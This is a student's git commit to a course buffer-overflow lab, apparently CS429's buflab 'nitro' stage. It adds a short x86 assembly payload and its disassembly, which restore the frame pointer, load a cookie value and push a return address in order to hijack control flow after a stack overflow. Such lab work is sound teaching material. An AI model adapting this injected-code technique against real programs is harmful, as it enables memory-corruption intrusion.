59a2e31b28f5d6748736d3a36e2717c14b0813f4
otisbrower <otis.brower@centexbe.com>
2015-04-12 23:39:37 -0500

    added stuff

---
+++ CS429/buflab-handout/nitro.s
@@ -0,0 +1,4 @@
+lea 0x28 (%esp), %ebp
+movl $0x34b2f5eb, %eax
+pushl $0x08048e22
+ret
---
+++ CS429/buflab-handout/nitroass.s
@@ -0,0 +1,11 @@
+
+nitro.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
+   4:	b8 eb f5 b2 34       	mov    $0x34b2f5eb,%eax
+   9:	68 22 8e 04 08       	push   $0x8048e22
+   e:	c3                   	ret    
